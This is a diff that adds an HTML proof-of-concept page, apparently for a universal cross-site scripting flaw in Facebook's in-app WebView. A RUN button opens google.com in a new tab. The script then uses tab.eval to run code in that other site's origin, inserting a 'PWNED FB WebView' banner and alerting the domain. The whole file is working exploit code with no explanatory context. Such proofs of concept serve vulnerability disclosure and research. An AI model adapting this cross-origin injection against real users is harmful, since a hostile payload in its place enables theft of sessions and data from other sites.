@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="exploit()">RUN</button>
+<pre id="status">...</pre>
+
+<script>
+function exploit() {
+  const tab = window.open(
+    "https://www.google.com/csi", "_blank"
+  );
+
+  if (!tab) {
+    document.getElementById('status').textContent = 
+      'Popup blocked!';
+    return;
+  }
+
+  setTimeout(() => {
+    try {
+      tab.eval(`
+        (function() {
+          if(window.__fbUxss) return;
+          window.__fbUxss = 1;
+          document.body?.insertAdjacentHTML(
+            'afterbegin',
+            '<h1 style="color:red">PWNED FB WebView</h1>'
+          );
+          alert(document.domain);
+        })();
+      `);
+    } catch(e) {
+      document.getElementById('status').textContent = 
+        'Failed: ' + e.message;
+    }
+  }, 800);
+}
+</script>
+</body>
+</html>
